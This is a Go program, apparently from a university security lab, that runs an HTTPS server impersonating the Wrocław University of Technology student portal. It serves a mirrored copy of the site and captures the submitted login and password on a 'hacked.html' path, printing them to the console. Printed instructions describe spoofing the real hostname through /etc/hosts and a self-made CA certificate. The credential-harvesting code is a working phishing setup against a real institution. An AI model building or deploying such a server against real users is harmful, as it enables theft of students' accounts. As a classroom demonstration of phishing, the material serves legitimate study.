package main

import (
	"crypto/tls"
	"fmt"
	"log"
	"net/http"
	"text/template"
)

func main() {

	// generate a `Certificate` struct
	var cert tls.Certificate
	var s *http.Server
	var err error
	if cert, err = tls.LoadX509KeyPair("certA.crt", "keyA.unencrypted.pem"); err == nil {
		// create a custom server with `TLSConfig`
		s = &http.Server{
			Addr:    ":8080",
			Handler: nil, // use `http.DefaultServeMux`
			TLSConfig: &tls.Config{
				Certificates: []tls.Certificate{cert},
			},
		}
	} else {
		log.Fatal(err)
	}

	fs := http.FileServer(http.Dir("./html/edukacja.pwr.wroc.pl"))

	http.HandleFunc("/",
		func(w http.ResponseWriter, r *http.Request) {
			switch r.Method {
			case "GET":
				fs.ServeHTTP(w, r)
			case "POST":
				if r.URL.Path[1:] == "EdukacjaWeb/hacked.html" {
					err := r.ParseForm()
					if err != nil {
						log.Fatal(err)
						return
					}
					fmt.Println(r.PostForm)
					// make templete and serve it with data
					tmpl, err := template.ParseFiles("./html/hacked.html")
					if err != nil {
						http.Error(w, err.Error(), http.StatusInternalServerError)
					}

					data := struct {
						Login    string
						Password string
					}{
						Login:    r.PostForm["login"][0],
						Password: r.PostForm["password"][0],
					}

					err = tmpl.Execute(w, data)
					if err != nil {
						http.Error(w, err.Error(), http.StatusInternalServerError)
					}
				} else {
					http.Redirect(w, r, "https://edukacja.pwr.wroc.pl/EdukacjaWeb/studia.do", 302)
				}
			}
		})

	fmt.Printf("Starting server at port 8080\n")
	fmt.Println("https://my.bezpieka.pl/EdukacjaWeb/studia.do")
	fmt.Println("To have this server on hostname: edukacja.pwr.wroc.pl, add following to /etc/hosts")
	fmt.Println("127.0.0.1       edukacja.pwr.wroc.pl")
	fmt.Println("and ofc in Common names when creating CA, type: edukacja.pwr.wroc.pl")
	fmt.Println("I have redirected my.bezpieka.pl to localhost")
	// run server on port "8080"
	log.Fatal(s.ListenAndServeTLS("", ""))
}
